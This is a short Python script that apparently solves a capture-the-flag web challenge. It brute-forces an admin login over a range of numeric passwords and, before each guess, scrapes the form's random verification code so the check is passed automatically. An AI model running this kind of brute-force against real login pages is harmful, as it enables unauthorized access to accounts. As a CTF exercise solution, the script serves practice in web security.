import requests
from bs4 import BeautifulSoup
import re
web_url="http://ctf.whaledu.com:10010/web38/9s81jWjd98YU.php"
model=web_url+"?username=admin&password={password}&randcode={code}"
false_state = "密码错误"

for i in range(12111,11111,-1):
    ss = requests.session()
    content = ss.get(web_url).content.decode("utf-8")
    bs = BeautifulSoup(content,"html.parser")
    u = bs.find("form")
    rs = re.findall(r"[0-9]+",str(u))
    code = rs[3]
    tmp = model.format(password=i,code=code)
    content = ss.get(url=tmp).content.decode("utf-8")
    if false_state not in content:
        print(content)
        break